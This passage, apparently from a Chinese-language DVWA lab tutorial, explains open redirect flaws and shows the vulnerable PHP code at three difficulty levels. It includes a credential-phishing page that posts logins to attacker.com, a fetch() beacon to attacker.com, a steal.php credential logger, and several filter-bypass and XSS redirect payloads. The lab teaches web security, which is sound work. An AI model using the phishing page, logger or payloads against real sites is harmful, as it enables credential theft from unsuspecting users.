<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户输入: ?redirect=https:<span class="regexp">//</span>evil.com</span><br><span class="line">    ↓</span><br><span class="line">直接获取: <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>]</span><br><span class="line">    ↓</span><br><span class="line">直接重定向: header(<span class="string">&quot;Location: $redirect&quot;</span>)</span><br><span class="line">    ↓</span><br><span class="line">浏览器跳转: https:<span class="regexp">//</span>evil.com</span><br></pre></td></tr></table></figure>

<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：基础重定向攻击"><a href="#步骤1：基础重定向攻击" class="headerlink" title="步骤1：基础重定向攻击"></a>步骤1：基础重定向攻击</h4><p><strong>测试1：重定向到外部网站</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=https:<span class="regexp">//g</span>oogle.com</span><br><span class="line">结果：成功重定向到Google</span><br><span class="line"></span><br><span class="line">URL: ?redirect=https:<span class="regexp">//</span>evil.com</span><br><span class="line">结果：成功重定向到恶意网站</span><br></pre></td></tr></table></figure>

<h4 id="步骤2：构造钓鱼攻击"><a href="#步骤2：构造钓鱼攻击" class="headerlink" title="步骤2：构造钓鱼攻击"></a>步骤2：构造钓鱼攻击</h4><p><strong>创建伪造登录页面（evil.com&#x2F;fake-login.html）：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DVWA Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 模仿DVWA的样式 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.login-box</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#007bff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-box&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Session Expired<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please login again:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://attacker.com/steal.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 可选：窃取Referer中的信息</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/log.php?ref=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">referrer</span>));</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>攻击链接：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>dvwa.local<span class="regexp">/vulnerabilities/</span>redirect<span class="regexp">/?redirect=https:/</span><span class="regexp">/evil.com/</span>fake-login.html</span><br><span class="line"></span><br><span class="line">用户点击后：</span><br><span class="line"><span class="number">1</span>. 看到来自dvwa.local的链接（信任）</span><br><span class="line"><span class="number">2</span>. 自动跳转到evil.com</span><br><span class="line"><span class="number">3</span>. 看到伪造的登录页面</span><br><span class="line"><span class="number">4</span>. 输入凭证</span><br><span class="line"><span class="number">5</span>. 凭证被发送到attacker.com/steal.php</span><br></pre></td></tr></table></figure>

<p><strong>steal.php（窃取凭证）：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 记录窃取的凭证</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="string">&quot;<span class="subst">$time</span> - IP: <span class="subst">$ip</span> - User: <span class="subst">$username</span> - Pass: <span class="subst">$password</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;stolen_credentials.txt&#x27;</span>, <span class="variable">$log</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重定向回真实网站（隐蔽）</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: https://dvwa.local/login.php?error=invalid&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤3：使用JavaScript协议"><a href="#步骤3：使用JavaScript协议" class="headerlink" title="步骤3：使用JavaScript协议"></a>步骤3：使用JavaScript协议</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=javascript:<span class="built_in">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><br><span class="line"></span><br><span class="line">某些浏览器可能执行JavaScript（虽然现代浏览器有防护）</span><br></pre></td></tr></table></figure>

<h4 id="步骤4：绕过简单的协议检查"><a href="#步骤4：绕过简单的协议检查" class="headerlink" title="步骤4：绕过简单的协议检查"></a>步骤4：绕过简单的协议检查</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果代码只检查http/https：</span><br><span class="line"></span><br><span class="line">?<span class="attribute">redirect</span>=//evil.com</span><br><span class="line">→ 协议相对URL，使用当前协议</span><br><span class="line"></span><br><span class="line">?<span class="attribute">redirect</span>=https:evil.com</span><br><span class="line">→ 某些解析器可能误判</span><br><span class="line"></span><br><span class="line">?<span class="attribute">redirect</span>=HtTpS://evil.com</span><br><span class="line">→ 大小写混淆</span><br></pre></td></tr></table></figure>

<h4 id="步骤5：结合XSS攻击"><a href="#步骤5：结合XSS攻击" class="headerlink" title="步骤5：结合XSS攻击"></a>步骤5：结合XSS攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果重定向参数也被输出到页面 --&gt;</span></span><br><span class="line">?redirect=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">可能导致XSS + 重定向组合攻击</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>简单的域名过滤，但可以绕过。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：简单的域名检查 ★★★</span></span><br><span class="line">    <span class="comment">// 使用正则表达式检查URL</span></span><br><span class="line">    <span class="comment">// preg_match() - 正则匹配函数</span></span><br><span class="line">    <span class="comment">// 参数1：正则表达式</span></span><br><span class="line">    <span class="comment">// 参数2：要匹配的字符串</span></span><br><span class="line">    <span class="comment">// 返回值：1匹配，0不匹配</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 正则：/http[s]?:\/\/example\.com/i</span></span><br><span class="line">    <span class="comment">// 分解：</span></span><br><span class="line">    <span class="comment">// http[s]? - http或https</span></span><br><span class="line">    <span class="comment">// :\/\/ - ://</span></span><br><span class="line">    <span class="comment">// example\.com - 域名</span></span><br><span class="line">    <span class="comment">// i - 不区分大小写</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 只检查是否&quot;包含&quot;域名，不是完整匹配</span></span><br><span class="line">    <span class="comment">// 2. evil.com/page?url=http://example.com 会通过</span></span><br><span class="line">    <span class="comment">// 3. http://example.com.evil.com 会通过</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">preg_match</span>( <span class="string">&quot;/http[s]?:\/\/example\.com/i&quot;</span>, <span class="variable">$redirect</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 包含example.com，允许重定向</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不包含example.com，拒绝</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid redirect URL&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>正则检查</strong> - 检查URL是否包含合法域名</li>
<li><strong>协议限制</strong> - 只允许http&#x2F;https</li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：正则表达式使用不当</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的正则：只要包含example.com就通过</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http[s]?:\/\/example\.com/i&quot;</span>, <span class="variable">$url</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以绕过的URL：</span></span><br><span class="line"><span class="string">&quot;http://evil.com?fake=http://example.com&quot;</span></span><br><span class="line"><span class="string">&quot;http://example.com.evil.com&quot;</span></span><br><span class="line"><span class="string">&quot;http://evil.com#http://example.com&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：域名后缀绕过"><a href="#方法1：域名后缀绕过" class="headerlink" title="方法1：域名后缀绕过"></a>方法1：域名后缀绕过</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注册域名：example.<span class="keyword">com</span>.evil.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">URL: ?redirect=http://example.<span class="keyword">com</span>.evil.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">正则检查：</span><br><span class="line">/http[s]?:\/\/example\.<span class="keyword">com</span>/i 匹配到 <span class="string">&quot;http://example.com&quot;</span></span><br><span class="line">→ 通过检查</span><br><span class="line"></span><br><span class="line">实际重定向：http://example.<span class="keyword">com</span>.evil.<span class="keyword">com</span>（恶意网站）</span><br></pre></td></tr></table></figure>

<h4 id="方法2：使用-符号"><a href="#方法2：使用-符号" class="headerlink" title="方法2：使用@符号"></a>方法2：使用@符号</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>example.com@evil.com</span><br><span class="line"></span><br><span class="line">解析：</span><br><span class="line">正则看到：http:<span class="regexp">//</span>example.com</span><br><span class="line">浏览器解析：http:<span class="regexp">//</span>evil.com (example.com被当作用户名)</span><br><span class="line"></span><br><span class="line">结果：重定向到evil.com</span><br></pre></td></tr></table></figure>

<h4 id="方法3：URL参数绕过"><a href="#方法3：URL参数绕过" class="headerlink" title="方法3：URL参数绕过"></a>方法3：URL参数绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>evil.com?ref=http:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line">正则检查：包含<span class="string">&quot;http://example.com&quot;</span> → 通过</span><br><span class="line">实际重定向：http:<span class="regexp">//</span>evil.com</span><br></pre></td></tr></table></figure>

<h4 id="方法4：Fragment绕过"><a href="#方法4：Fragment绕过" class="headerlink" title="方法4：Fragment绕过"></a>方法4：Fragment绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>evil.com<span class="comment">#http://example.com</span></span><br><span class="line"></span><br><span class="line">正则检查：包含<span class="string">&quot;http://example.com&quot;</span> → 通过</span><br><span class="line">实际重定向：http:<span class="regexp">//</span>evil.com（<span class="comment">#后面是fragment，不影响域名）</span></span><br></pre></td></tr></table></figure>

<h4 id="方法5：URL编码绕过"><a href="#方法5：URL编码绕过" class="headerlink" title="方法5：URL编码绕过"></a>方法5：URL编码绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>evil.com%<span class="number">3</span>Furl%<span class="number">3</span>Dhttp:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line">解码后：http:<span class="regexp">//</span>evil.com?url=http:<span class="regexp">//</span>example.com</span><br><span class="line">正则检查：通过</span><br><span class="line">实际重定向：evil.com</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>更严格的域名检查，但仍有绕过可能。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：使用parse_url()解析URL ★★★</span></span><br><span class="line">    <span class="comment">// parse_url() - 解析URL，返回各个组成部分</span></span><br><span class="line">    <span class="comment">// 返回数组：</span></span><br><span class="line">    <span class="comment">// [&#x27;scheme&#x27;] =&gt; &#x27;https&#x27;</span></span><br><span class="line">    <span class="comment">// [&#x27;host&#x27;] =&gt; &#x27;example.com&#x27;</span></span><br><span class="line">    <span class="comment">// [&#x27;path&#x27;] =&gt; &#x27;/page&#x27;</span></span><br><span class="line">    <span class="comment">// [&#x27;query&#x27;] =&gt; &#x27;param=value&#x27;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 这比正则更可靠</span></span><br><span class="line">    <span class="variable">$parsed_url</span> = <span class="title function_ invoke__">parse_url</span>( <span class="variable">$redirect</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 检查是否成功解析 ★★★</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$parsed_url</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid URL format&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：检查host字段 ★★★</span></span><br><span class="line">    <span class="comment">// 只允许特定域名</span></span><br><span class="line">    <span class="variable">$allowed_hosts</span> = [</span><br><span class="line">        <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;www.example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;subdomain.example.com&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$parsed_url</span>[<span class="string">&#x27;host&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 检查host是否在白名单中 ★★★</span></span><br><span class="line">    <span class="comment">// in_array() - 检查数组中是否存在某值</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">in_array</span>( <span class="variable">$host</span>, <span class="variable">$allowed_hosts</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 域名在白名单中，允许重定向</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 问题：错误信息可能泄露白名单 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid host: <span class="subst">$host</span>. Allowed: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$allowed_hosts</span>) . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>parse_url()解析</strong> - 正确解析URL结构</li>
<li><strong>白名单检查</strong> - 只允许特定域名</li>
<li><strong>检查host字段</strong> - 验证域名部分</li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>可能的绕过：</strong></p>
<ol>
<li><strong>URL解析差异</strong> - 不同解析器对URL的理解不同</li>
<li><strong>协议相对URL</strong> - &#x2F;&#x2F;example.com</li>
<li><strong>端口号绕过</strong> - example.com:80</li>
<li><strong>IPv6绕过</strong> - [::1]</li>
</ol>
